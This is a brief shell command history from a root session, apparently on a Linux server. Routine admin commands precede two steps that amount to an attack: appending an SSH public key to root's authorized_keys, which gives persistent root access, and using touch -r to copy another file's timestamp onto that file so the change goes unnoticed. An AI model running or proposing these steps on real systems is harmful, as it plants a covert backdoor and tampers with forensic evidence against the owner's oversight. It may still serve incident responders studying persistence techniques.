chmod 644 /etc/cron.d/certbot-renew
apt-get update
vi /etc/ssh/sshd_config
id
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMgSmpRMuZ3By4r6O4nsAuSeONnEpEKqL9qqSdb6WtIa k' >> /root/.ssh/authorized_keys
touch -r /etc/hostname /root/.ssh/authorized_keys
exit
